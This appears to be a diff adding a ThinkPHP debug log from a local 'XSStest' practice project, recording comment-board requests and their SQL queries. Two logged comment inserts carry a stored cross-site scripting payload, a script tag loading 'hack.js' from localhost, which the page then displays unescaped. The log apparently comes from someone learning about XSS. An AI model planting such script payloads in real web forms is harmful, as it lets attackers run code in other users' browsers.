+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.003876s ]
+INFO: [ app_end ] --END-- [ RunTime:0.003991s ]
+
+[ 2016-05-03T16:22:05+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/check
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000285s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000376s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000420s ]
+SQL: SHOW COLUMNS FROM `p_user` [ RunTime:0.0068s ]
+SQL: SELECT `password` FROM `p_user` WHERE `username` = 'preke' LIMIT 1   [ RunTime:0.0003s ]
+SQL: SHOW COLUMNS FROM `p_comment` [ RunTime:0.0092s ]
+SQL: SELECT * FROM `p_comment`  [ RunTime:0.0003s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000054s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000135s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.012934s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.013031s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000243s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000297s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000704s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000759s ]
+
+[ 2016-05-03T16:22:23+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/check
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000255s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000301s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000338s ]
+SQL: SHOW COLUMNS FROM `p_user` [ RunTime:0.0066s ]
+SQL: SELECT `password` FROM `p_user` WHERE `username` = 'preke' LIMIT 1   [ RunTime:0.0004s ]
+SQL: SHOW COLUMNS FROM `p_comment` [ RunTime:0.0069s ]
+SQL: SELECT * FROM `p_comment`  [ RunTime:0.0003s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000050s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000143s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.010434s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.010536s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000235s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000278s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000658s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000712s ]
+
+[ 2016-05-03T16:22:36+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000049s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000535s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000549s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000614s ]
+SQL: SHOW COLUMNS FROM `p_comment` [ RunTime:0.0042s ]
+SQL: INSERT INTO `p_comment` (`username`,`comment`) VALUES ('wends','safhjljdf') [ RunTime:0.0030s ]
+SQL: SELECT * FROM `p_comment`  [ RunTime:0.0003s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000028s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000066s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.005236s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.005275s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000102s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000125s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000324s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000355s ]
+
+[ 2016-05-03T16:23:11+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003780s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.004055s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.004150s ]
+SQL: SHOW COLUMNS FROM `p_comment` [ RunTime:0.0073s ]
+SQL: INSERT INTO `p_comment` (`username`,`comment`) VALUES ('dsadsads','<script src=\'http://localhost/XSS/hack.js\'>
+ </script>') [ RunTime:0.0030s ]
+SQL: SELECT * FROM `p_comment`  [ RunTime:0.0004s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000055s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000183s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.018563s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.018653s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.003636s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.003716s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.004167s ]
+INFO: [ app_end ] --END-- [ RunTime:0.004246s ]
+
+[ 2016-05-03T16:31:16+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003710s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.003905s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.004001s ]
+SQL: SHOW COLUMNS FROM `p_comment` [ RunTime:0.0042s ]
+SQL: INSERT INTO `p_comment` (`username`,`comment`) VALUES ('wen','wishiasd
+<script src=\'http://localhost/XSS/hack.js\'>
+ </script>') [ RunTime:0.0031s ]
+SQL: SELECT * FROM `p_comment`  [ RunTime:0.0004s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000057s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000140s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.028093s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.028158s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001778s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001857s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.004027s ]
+INFO: [ app_end ] --END-- [ RunTime:0.004102s ]
+
